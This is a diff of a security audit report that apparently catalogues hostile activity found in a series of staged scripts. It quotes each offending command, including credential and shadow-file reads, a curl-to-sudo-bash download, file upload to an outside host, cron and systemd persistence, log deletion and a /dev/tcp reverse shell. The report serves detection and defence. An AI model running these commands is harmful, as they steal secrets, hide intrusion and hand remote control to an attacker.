@@ -167,7 +167,7 @@ Notable files   (a finding of high severity)
   [x] output  audit_20261022_093500.jsonl
       found   ScheduledJobCreation, AccountCreation, SecurityToolDisabling, FirewallDisabling, useradd (Persistence), iptables (DefenseImpairment)
 
-Targeted   (hardcoded in a script; prior: no earlier output holds it; discovered: an earlier output does)
+Targeted   (hardcoded values: prior means no earlier output holds it, discovered means one does; subjects: each entity an activity acted on)
   Usernames (1)
     [!] ops  prior  20261022_092500_step06_stage.sh:6
         what  ssh ops@198.51.100.7 'cat /etc/hostname' (20261022_092500_step06_stage.sh:6)
@@ -183,6 +183,78 @@ Targeted   (hardcoded in a script; prior: no earlier output holds it; discovered
         what  sudo bash -c "$(curl -fsSL http://203.0.113.40/s.sh)" (20261022_092500_step06_stage.sh:4)
     [!] 203.0.113.41     public   prior  20261022_093000_step07_channel.py:6
         what  H = "203.0.113.41" (20261022_093000_step07_channel.py:6)
+  Searched (1)
+    [i] /  SetuidFileSearch
+        what  SetuidFileSearch: find / -perm -4000 -type f 2>/dev/null > suid_20261022_090030.txt (20261022_090000_step01_recon.sh:8)
+  Url (3)
+    [x] http://169.254.169.254/latest/meta-data/  CloudMetadataAccess
+        what  CloudMetadataAccess: curl -s http://169.254.169.254/latest/meta-data/ > meta_20261022_090040.txt (20261022_090000_step01_recon.sh:9)
+    [x] https://files.example.net/up              FileUpload
+        what  FileUpload: curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)
+    [x] http://203.0.113.40/s.sh                  ShellDownloadAndExecute
+        what  ShellDownloadAndExecute: sudo bash -c "$(curl -fsSL http://203.0.113.40/s.sh)" (20261022_092500_step06_stage.sh:4)
+  Service (2)
+    [i] sshd    ServiceDiscovery
+        what  ServiceDiscovery: systemctl status sshd (20261022_090000_step01_recon.sh:7)
+    [x] auditd  SecurityToolDisabling
+        what  SecurityToolDisabling: systemctl stop auditd (20261022_092000_step05_evade.sh:4)
+              SecurityToolDisabling: systemctl stop auditd (audit_20261022_093500.jsonl)
+  File (10)
+    [x] /etc/shadow             ShadowFileRead
+        what  ShadowFileRead: sudo cat /etc/shadow > shadow_20261022_090530.txt (20261022_090500_step02_creds.sh:6)
+    [x] ~/.ssh/id_rsa           PrivateKeyRead
+        what  PrivateKeyRead: cat ~/.ssh/id_rsa (20261022_090500_step02_creds.sh:4)
+    [x] ~/.aws/credentials      CredentialFileRead
+        what  CredentialFileRead: cat ~/.aws/credentials (20261022_090500_step02_creds.sh:3)
+    [x] ~/.bash_history         ShellHistoryRead
+        what  ShellHistoryRead: grep -i token ~/.bash_history (20261022_090500_step02_creds.sh:5)
+    [x] /etc/sudoers.d/svc      SudoersModification
+        what  SudoersModification: echo "$RULE" >> /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)
+    [x] /tmp/tool ($F)          SetuidBit
+        what  SetuidBit: chmod u+s "$F" (20261022_091000_step03_privesc.sh:4)
+    [x] ~/.ssh/authorized_keys  SshKeyPersistence
+        what  SshKeyPersistence: echo "$KEY" >> ~/.ssh/authorized_keys (20261022_091500_step04_persist.sh:4)
+    [x] ~/.bashrc               ShellProfilePersistence
+        what  ShellProfilePersistence: echo "$LINE" >> ~/.bashrc (20261022_091500_step04_persist.sh:8)
+    [!] $F                      Timestomp
+        what  Timestomp: touch -r /bin/ls "$F" (20261022_092000_step05_evade.sh:8)
+    [x] out.tgz                 FileUpload
+        what  FileUpload: curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)
+  Rule (1)
+    [x] $RULE  SudoersModification
+        what  SudoersModification: echo "$RULE" >> /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)
+  Mount (1)
+    [x] /:/host  ContainerEscape
+        what  ContainerEscape: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)
+  Runs (1)
+    [x] $JOB  ScheduledJobCreation
+        what  ScheduledJobCreation: (crontab -l; echo "$JOB") | crontab - (20261022_091500_step04_persist.sh:3)
+  Unit (1)
+    [x] sync.service  SystemdUnitCreation
+        what  SystemdUnitCreation: cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)
+              SystemdUnitCreation: systemctl enable --now sync.service (20261022_091500_step04_persist.sh:6)
+  Account (1)
+    [x] svc  AccountCreation
+        what  AccountCreation: useradd -m -s /bin/bash svc (20261022_091500_step04_persist.sh:7)
+              AccountCreation: useradd -m -s /bin/bash svc (audit_20261022_093500.jsonl)
+  Adds (1)
+    [x] $LINE  ShellProfilePersistence
+        what  ShellProfilePersistence: echo "$LINE" >> ~/.bashrc (20261022_091500_step04_persist.sh:8)
+  Log (1)
+    [x] /var/log/auth.log  LogDeletion
+        what  LogDeletion: rm -f /var/log/auth.log (20261022_092000_step05_evade.sh:6)
+  Setting (1)
+    [x] HISTFILE  HistoryDisabling
+        what  HistoryDisabling: unset HISTFILE (20261022_092000_step05_evade.sh:3)
+  Archive (1)
+    [!] out.tgz  ArchiveCreation
+        what  ArchiveCreation: tar czf out.tgz dir/ (20261022_092500_step06_stage.sh:3)
+  Host (1)
+    [x] 203.0.113.41 ($H)  ReverseShell
+        what  ReverseShell: os.system("exec 3<>/dev/tcp/$H/$PORT") (20261022_093000_step07_channel.py:8)
+  Port (1)
+    [x] $PORT  ReverseShell
+        what  ReverseShell: os.system("exec 3<>/dev/tcp/$H/$PORT") (20261022_093000_step07_channel.py:8)
 
 Exposure   (collected: first seen in an output; used: first seen in a script; a secret is masked)
   Passwords and secrets (3)
